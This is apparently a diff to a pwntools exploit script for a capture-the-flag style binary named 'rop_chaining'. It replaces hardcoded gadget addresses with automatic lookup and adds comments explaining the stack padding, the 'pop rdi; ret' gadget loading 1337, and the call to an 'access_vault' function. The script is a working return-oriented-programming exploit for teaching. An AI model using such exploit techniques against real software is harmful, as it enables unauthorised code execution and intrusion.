@@ -11,10 +11,13 @@ if __name__ == '__main__':
 
     args = parser.parse_args()
 
-    POP_EDI_GADGET_ADDR = 0x0000000000401253
-    ACCESS_VAULT_FUNCTION_ADDR = 0x0000000000401176
-
     elf = context.binary = ELF('rop_chaining')
+
+    rop = ROP(elf)
+
+    # Address can also be found by running 'ropper --file rop_chaining --search "pop rdi; ret"'
+    pop_rdi_gadget_addr = rop.find_gadget(['pop rdi', 'ret'])[0]
+    access_vault_function_addr = elf.symbols['access_vault']
 
     if args.debug:
         io = gdb.debug(context.binary.path, '''
@@ -27,8 +30,13 @@ if __name__ == '__main__':
 
     io.recvuntil(b"Enter the password to access Santa Ono's secret vault:")
 
-    payload = (b'A' * 0x10 + b'B' * 0x8 +
-               p64(POP_EDI_GADGET_ADDR) + p64(1337) + p64(ACCESS_VAULT_FUNCTION_ADDR))
+    # Padding to get to return address
+    padding = b'A' * 0x10 + b'B' * 0x8
+    # Pop 1337 into rdi register
+    pop_1337_payload = p64(pop_rdi_gadget_addr) + p64(1337)
+    # Notice last chain is calling the target access_vault function
+    # Most 64-bit calling conventions place the first argument in rdi
+    payload = padding + pop_1337_payload + p64(access_vault_function_addr)
 
     io.send(payload)
 
